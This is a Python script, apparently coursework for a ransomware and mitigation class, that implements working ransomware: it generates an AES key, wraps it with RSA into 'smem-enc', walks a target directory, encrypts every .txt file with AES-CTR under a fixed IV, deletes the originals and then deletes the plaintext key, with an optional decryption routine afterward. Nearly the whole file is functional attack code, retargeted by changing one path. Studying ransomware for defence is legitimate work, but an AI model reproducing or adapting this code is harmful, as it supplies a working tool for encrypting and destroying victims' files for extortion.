from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# Created by Max Gallagher
# SEC 440 Ransomware & Mitigation

# Function to encrypt symmetric key with the provided public key and save to 'smem-enc'
def encrypt_symmetric_key(symmetric_key, public_key):
    # Encrypt symmetric key using the public key and write the encrypted key to 'smem-enc' file
    encrypted_smem = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open('smem-enc', 'wb') as f:
        f.write(encrypted_smem)

# Function to decrypt 'smem-enc' and retrieve 'smem_unencrypted.txt'
def decrypt_smem_enc(private_key):
    if os.path.exists('smem-enc'):
        with open('smem-enc', 'rb') as f:
            encrypted_smem = f.read()
        # Decrypt 'smem-enc' using the private key and write the decrypted key to 'smem_unencrypted.txt'
        smem = private_key.decrypt(
            encrypted_smem,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open('smem_unencrypted.txt', 'wb') as f:
            f.write(smem)
    else:
        print("smem-enc file does not exist.")

# Generate or load symmetric key ('smem_unencrypted.txt')
smem_file = 'smem_unencrypted.txt'
if os.path.exists(smem_file):
    # Load existing symmetric key if 'smem_unencrypted.txt' exists
    with open(smem_file, 'rb') as f:
        smem = f.read()
else:
    # Generate a new symmetric key and save it to 'smem_unencrypted.txt' if file does not exist
    smem = os.urandom(32)
    with open(smem_file, 'wb') as f:
        f.write(smem)

# Check if 'smem-enc' file exists
if not os.path.exists('smem-enc'):
    # Load or generate RSA key pair and encrypt symmetric key with the public key
    private_key_file = 'private_key.pem'
    public_key_file = 'public_key.pem'

    if os.path.exists(private_key_file) and os.path.exists(public_key_file):
        # Load existing private and public keys if files exist
        with open(private_key_file, 'rb') as f:
            private_key_pem = f.read()
        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())

        with open(public_key_file, 'rb') as f:
            public_key_pem = f.read()
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    else:
        # Generate new RSA key pair if files do not exist
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        with open(private_key_file, 'wb') as f:
            f.write(private_key_pem)

        public_key = private_key.public_key()

        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        with open(public_key_file, 'wb') as f:
            f.write(public_key_pem)

    # Encrypt symmetric key with the public key and save to 'smem-enc'
    encrypt_symmetric_key(smem, public_key)
else:
    print("smem-enc file already exists. Skipping generation of new symmetric key.")

# Enable/disable deletion of unencrypted smem file after encryption
delete_smem_after_encryption = True  # Set to False to prevent deletion of 'smem_unencrypted.txt'

# Encrypt process
target_files = []
dir_path = r'C:\Users\maxga\Desktop\test'  # Change this directory path to your target directory

for root, dirs, files in os.walk(dir_path):
    for file in files:
        if file.endswith('.txt'):
            target_files.append(os.path.join(root, file))

for file_path in target_files:
    encrypted_file_path = file_path + '.encrypted'
    if os.path.exists(encrypted_file_path):
        continue  # Skip re-encrypting already encrypted files
    
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    # Encrypt each '.txt' file with AES symmetric encryption and write the ciphertext to a new file with '.encrypted' extension
    cipher = Cipher(algorithms.AES(smem), modes.CTR(b'\0' * 16), backend=default_backend())  # Using a fixed IV
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(encrypted_file_path, 'wb') as f:
        f.write(ciphertext)

    # Delete original file after encryption, if the variable allows deletion
    if delete_smem_after_encryption and os.path.exists(file_path):
        os.remove(file_path)

# Delete unencrypted smem file after encryption, if the variable allows deletion
if delete_smem_after_encryption and os.path.exists(smem_file):
    os.remove(smem_file)

# Decrypt process using the symmetric key from 'smem_unencrypted.txt' (Optional)
perform_smem_decryption = False  # Set to False if you do not want to perform decryption

if perform_smem_decryption:
    private_key_file = 'private_key.pem'

    if os.path.exists(private_key_file):
        with open(private_key_file, 'rb') as f:
            private_key_pem = f.read()
            private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
            decrypt_smem_enc(private_key)
    else:
        print("Private key file not found. Decryption of 'smem-enc' cannot proceed.")
else:
    print("Skipping decryption of 'smem-enc'.")

# Decrypt files using the symmetric key from 'smem_unencrypted.txt' (Optional)
smem_file = 'smem_unencrypted.txt'

if os.path.exists(smem_file):
    with open(smem_file, 'rb') as f:
        smem = f.read()
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                encrypted_file_path = os.path.join(root, file)

                if encrypted_file_path.endswith('.encrypted'):
                    with open(encrypted_file_path, 'rb') as f:
                        ciphertext = f.read()

                    # Decrypt each '.encrypted' file with AES symmetric decryption and write the plaintext to a new file
                    cipher = Cipher(algorithms.AES(smem), modes.CTR(b'\0' * 16), backend=default_backend())
                    decryptor = cipher.decryptor()
                    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

                    decrypted_file_path = encrypted_file_path[:-10]  # Remove '.encrypted' extension
                    with open(decrypted_file_path, 'wb') as f:
                        f.write(plaintext)

                    # Delete the encrypted file after decryption
                    os.remove(encrypted_file_path)
else:
    print("Symmetric key file not found. Decryption cannot proceed.")
